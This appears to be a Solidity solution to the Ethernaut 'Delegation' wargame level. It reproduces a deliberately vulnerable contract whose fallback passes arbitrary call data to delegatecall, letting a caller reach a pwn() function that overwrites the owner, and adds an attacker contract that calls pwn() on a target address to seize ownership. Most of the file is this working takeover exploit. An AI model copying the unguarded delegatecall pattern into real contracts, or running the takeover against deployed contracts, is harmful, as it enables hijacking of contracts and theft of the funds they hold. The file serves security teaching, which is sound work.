// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}


contract Delegatoor {

    function sendWithData(address $your_ethernaut_address_here) public returns (bool) {
        Delegation delegation = Delegation($your_ethernaut_address_here);
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success);
    }
}